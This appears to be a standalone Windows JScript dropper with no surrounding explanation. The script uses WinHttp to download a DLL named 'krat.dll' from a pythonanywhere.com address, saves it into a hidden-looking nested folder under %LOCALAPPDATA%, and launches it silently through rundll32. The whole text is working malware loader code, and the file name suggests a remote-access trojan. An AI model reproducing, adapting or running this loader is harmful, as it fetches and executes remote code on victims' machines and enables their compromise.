
		var agent = new ActiveXObject("WScript.Shell");
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

        http.Open("GET", "http://akinomoreno.pythonanywhere.com/krat.dll", false);
        http.Send();

        var httpBytes = http.ResponseBody;

        function ensureFolder(path) {
            if (fso.FolderExists(path))
                return;

            var parent = fso.GetParentFolderName(path);

            if (!fso.FolderExists(parent))
                ensureFolder(parent);

            fso.CreateFolder(path);
        }

        var outputDir = agent.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\iwannafuckfaye\\Kiel\\Loves\\Faye\\So\\Much";
        var cachePath = outputDir + "\\KielAndFayeLovesEachOther.dll";

        ensureFolder(outputDir);

        if (!fso.FileExists(cachePath)) {
            var storage = new ActiveXObject("ADODB.Stream");

            storage.Type = 1;
            storage.Open();
            storage.Write(httpBytes);
            storage.SaveToFile(cachePath, 2);
            storage.Close();

			agent.Run('rundll32.exe "' + cachePath + '" main', 0, false);
        }
      